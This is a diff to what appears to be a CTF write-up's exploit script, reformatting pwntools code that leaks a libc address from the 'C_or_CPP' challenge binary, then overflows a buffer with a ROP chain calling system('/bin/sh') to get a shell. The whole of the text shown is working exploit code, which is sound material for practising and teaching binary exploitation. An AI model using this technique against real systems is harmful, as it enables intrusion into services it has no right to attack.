@@ -1172,95 +1172,49 @@ exp:
 from pwn import *
 from wstube import websocket
 
-
-
 context(arch='amd64', os='linux', log_level='debug')
-
 local = True
-
 if local:
-
-p = process('./C_or_CPP')
-
+	p = process('./C_or_CPP')
 else:
-
-p = websocket("wss://ctf.xidian.edu.cn/api/traffic/hDcQ5CkjZdJqW3SMfJU3f?port=9999")
-
-# p = remote('pwnable.kr', 9032)
-
-  
+	p = websocket("wss://ctf.xidian.edu.cn/api/traffic/hDcQ5CkjZdJqW3SMfJU3f?port=9999")
+	# p = remote('pwnable.kr', 9032)
 
 elf = ELF('./C_or_CPP')
-
 libc = ELF('./lib/libc.so.6')
 
-  
-
 p.sendlineafter(b'option: ', b'2')
-
 p.sendlineafter(b'C++ String input: ', b'1')
-
-gdb.attach(p)
-
+# gdb.attach(p)
 p.sendlineafter(b'C String input:', b'a' * 0x50)
-
 p.recvuntil(b'a' * 0x50)
 
-  
-
 rebase = 0x4B1040
-
 leak = u64(p.recv(6).ljust(8, b'\x00'))
-
 base = leak - rebase
 
-  
-
 pop_rdi = base + 0x000000000002a3e5
-
 pop_rsi = base + 0x000000000002be51
-
 pop_rdx_rbx = base + 0x00000000000904a9
-
 binsh = base + 0x00000000001d8678
-
 system = base + libc.symbols['system']
 
-  
-
 p.sendlineafter(b'option: ', b'5')
-
 p.recvuntil(b'Try to say something: ')
 
-  
-
 payload = flat([
-
-b'a' * 0x48,
-
-pop_rdi,
-
-binsh,
-
-pop_rsi,
-
-0,
-
-pop_rdx_rbx,
-
-0,
-
-0,
-
-system
-
+	b'a' * 0x48,
+	pop_rdi,
+	binsh,
+	pop_rsi,
+	0,
+	pop_rdx_rbx,
+	0,
+	0,
+	system
 ])
 
-  
-
 p.sendline(payload)
-
-  
 
 p.interactive()
 ```
